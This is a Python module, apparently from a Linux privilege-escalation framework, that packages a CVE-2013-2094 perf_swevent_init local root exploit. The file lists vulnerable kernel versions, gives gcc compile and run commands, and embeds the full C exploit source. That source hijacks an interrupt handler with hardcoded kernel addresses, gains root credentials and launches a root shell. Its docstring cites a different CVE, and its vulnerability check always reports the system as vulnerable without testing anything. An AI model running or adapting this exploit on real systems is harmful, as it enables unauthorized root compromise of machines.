"""
https://github.com/SecWiki/linux-kernel-exploits/tree/master/2014/CVE-2014-4014
"""
import os
from exploits.exploit import LinuxExploit
from src.kernels import KernelWindow
from constants import *


class CVE20132094_64(LinuxExploit):
	def __init__(self, playground_path=PLAYGROUND_PATH):
		LinuxExploit.__init__(self)
		self.name = "CVE20132094_64"
		self.formatted_name = "CVE-2013-2094"
		self.e_type = "linux"
		self.brief_desc = "perf_swevent_init Local root exploit (64 bit)"
		self.reliability = MEDIUM_RELIABILITY
		self.vulnerable_base = KernelWindow(GENERIC_LINUX, BASE_VULNERABLE, 0, 0, 0, 3, 8, 9)
		self.vulnerable_kernels = [
			KernelWindow(RHEL, VERSION_VULNERABLE, 0, 0, 0, 2, 6, 32, highest_patch_level="2.6.32-358.6.2"),
			KernelWindow(SUSE, VERSION_VULNERABLE, 0, 0, 0, 3, 0, 74, highest_patch_level="3.0.74-0.6.8.1"),
			KernelWindow(CENTOS, VERSION_VULNERABLE, 2, 6, 32, 2, 6, 37, highest_patch_level="2.6.32-358.6.2"),
			KernelWindow(UBUNTU_13, VERSION_VULNERABLE, 0, 0, 0, 3, 5, 0, highest_patch_level="3.8.0-21.32"),
			KernelWindow(UBUNTU_12, VERSION_VULNERABLE, 0, 0, 0, 3, 2, 0, highest_patch_level="3.2.0-43.68"),
			KernelWindow(UBUNTU_12, VERSION_VULNERABLE, 0, 0, 0, 3, 5, 0, highest_patch_level="3.5.0-30.51"),
			KernelWindow(UBUNTU_GENERIC, BASE_VULNERABLE, 0, 0, 0, 3, 2, 0),
			KernelWindow(DEBIAN_8, VERSION_VULNERABLE, 0, 0, 0, 3, 8, 11, highest_patch_level="3.8.11-1"),
			KernelWindow(DEBIAN_7, VERSION_VULNERABLE, 0, 0, 0, 3, 2, 41, highest_patch_level="3.2.41-2+deb7u2"),
			KernelWindow(DEBIAN_GENERIC, BASE_VULNERABLE, 0, 0, 0, 3, 2, 41),
		]
		self.exploit_kernels = [
			KernelWindow(UBUNTU_12, EXPLOIT_AVAILABLE, 0, 0, 0, 3, 2, 0, highest_patch_level="3.2.0-43.68"),
			KernelWindow(UBUNTU_12, EXPLOIT_AVAILABLE, 0, 0, 0, 3, 5, 0, highest_patch_level="3.5.0-30.51"),

		]
		self.architecture = ARCHITECTURE_x86_64
		self.playground_path = playground_path
		self.exploit_source_file_name = "{}.c".format(self.name)
		self.source_c_path = os.path.join(self.playground_path, self.exploit_source_file_name)
		self.compilation_path = os.path.join(self.playground_path, self.name)
		self.compilation_command = "gcc -o {} {} -O2".format(self.compilation_path, self.source_c_path)
		self.exploit_command = self.compilation_path
		self.exploit_source = """
/**
 * Ubuntu 12.04 3.x x86_64 perf_swevent_init Local root exploit
 * by Vitaly Nikolenko (vnik5287@gmail.com)
 *
 * based on semtex.c by sd
 *
 * Supported targets:
 * [0] Ubuntu 12.04.0 - 3.2.0-23-generic
 * [1] Ubuntu 12.04.1 - 3.2.0-29-generic
 * [2] Ubuntu 12.04.2 - 3.5.0-23-generic
 *
 * $ gcc vnik.c -O2 -o vnik
 *
 * $ uname -r
 * 3.2.0-23-generic
 *
 * $ ./vnik 0
 */

#define _GNU_SOURCE 1
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <syscall.h>
#include <stdint.h>
#include <assert.h>

#define BASE  0x1780000000
#define SIZE  0x0010000000
#define KSIZE 0x2000000
#define AB(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))

typedef int __attribute__((regparm(3))) (*commit_creds_fn)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(unsigned long cred);

uint64_t targets[3][3] =
            {{0xffffffff81ef67e0,  // perf_swevent_enabled
              0xffffffff81091630,  // commit_creds
              0xffffffff810918e0}, // prepare_kernel_cred
             {0xffffffff81ef67a0,
              0xffffffff81091220,
              0xffffffff810914d0},
             {0xffffffff81ef5940,
              0xffffffff8107ee30,
              0xffffffff8107f0c0}
        };

void __attribute__((regparm(3))) payload() {
    uint32_t *fixptr = (void*)AB(1);
    // restore the handler
    *fixptr = -1;
    commit_creds_fn commit_creds = (commit_creds_fn)AB(2);
    prepare_kernel_cred_fn prepare_kernel_cred = (prepare_kernel_cred_fn)AB(3);
    commit_creds(prepare_kernel_cred((uint64_t)NULL));
}

void trigger(uint32_t off) {
    uint64_t buf[10] = { 0x4800000001, off, 0, 0, 0, 0x300 };
    int fd = syscall(298, buf, 0, -1, -1, 0);
    assert( !close(fd) );
}

int main(int argc, char **argv) {
    uint64_t off64, needle, kbase, *p;
    uint8_t *code;
    uint32_t int_n, j = 5, target = 1337;
    int offset = 0;
    void *map;

    assert(argc == 2 && "target?");
    assert( (target = atoi(argv[1])) < 3 );

    struct {
        uint16_t limit;
        uint64_t addr;
    } __attribute__((packed)) idt;

    // mmap user-space block so we don't page fault
    // on sw_perf_event_destroy
    assert((map = mmap((void*)BASE, SIZE, 3, 0x32, 0,0)) == (void*)BASE);
    memset(map, 0, SIZE);

    asm volatile("sidt %0" : "=m" (idt));
    kbase = idt.addr & 0xff000000;
    printf("IDT addr = 0x%lx\\n", idt.addr);

    assert((code = (void*)mmap((void*)kbase, KSIZE, 7, 0x32, 0, 0)) == (void*)kbase);
    memset(code, 0x90, KSIZE); code += KSIZE-1024; memcpy(code, &payload, 1024);
    memcpy(code-13,"\\x0f\\x01\\xf8\\xe8\\5\\0\\0\\0\\x0f\\x01\\xf8\\x48\\xcf", 13);

    // can only play with interrupts 3, 4 and 0x80
    for (int_n = 3; int_n <= 0x80; int_n++) {
        for (off64 = 0x00000000ffffffff; (int)off64 < 0; off64--) {
            int off32 = off64;

            if ((targets[target][0] + ((uint64_t)off32)*24) == (idt.addr + int_n*16 + 8)) {
                offset = off32;
                goto out;
            }
        }
        if (int_n == 4) {
            // shit, let's try 0x80 if the kernel is compiled with
            // CONFIG_IA32_EMULATION
            int_n = 0x80 - 1;
        }
    }
out:
    assert(offset);
    printf("Using int = %d with offset = %d\\n", int_n, offset);

    for (j = 0; j < 3; j++) {
        needle = AB(j+1);
        assert(p = memmem(code, 1024, &needle, 8));
        *p = !j ? (idt.addr + int_n * 16 + 8) : targets[target][j];
    }
    trigger(offset);
    switch (int_n) {
    case 3:
        asm volatile("int $0x03");
        break;
    case 4:
        asm volatile("int $0x04");
        break;
    case 0x80:
        asm volatile("int $0x80");
    }

    assert(!setuid(0));
    return execl("/bin/bash", "-sh", NULL);
}
"""

	def determine_vulnerability(self):
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name), color="blue")
		# if kernel matches...it should be vulnerable
		color_print("\t[-] system appears to be vulnerable to {}".format(self.name), color="green")
		return True
